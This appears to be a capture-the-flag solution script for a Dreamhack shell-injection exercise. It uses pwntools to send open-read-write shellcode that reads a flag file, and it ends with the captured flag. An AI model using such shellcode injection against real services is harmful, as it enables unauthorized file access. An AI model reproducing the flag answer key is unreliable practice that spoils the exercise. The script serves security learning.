from pwn import *

p = remote("host3.dreamhack.games", 18416)

context.arch = "amd64" # set architecture to 64-bit
path = "/home/shell_basic/flag_name_is_loooooong" # we need to open this file

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# the result of open() is the file descriptor and it is stored in rax
shellcode += shellcraft.read('rax', 'rsp', 0x100) # read(fd, buf, 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100) # write(stdout, buf, 0x100)
shellcode = asm(shellcode) # transform the shellcode into assembly code

payload = shellcode # payload = shellcode
p.sendlineafter("shellcode: ", payload) # input the shellcode after the prompt "shellcode: "
print(p.recv(0x100)) # print the first 0x100 bytes of the response

# DH{ca562d7cf1db6c55cb11c4ec350a3c0b}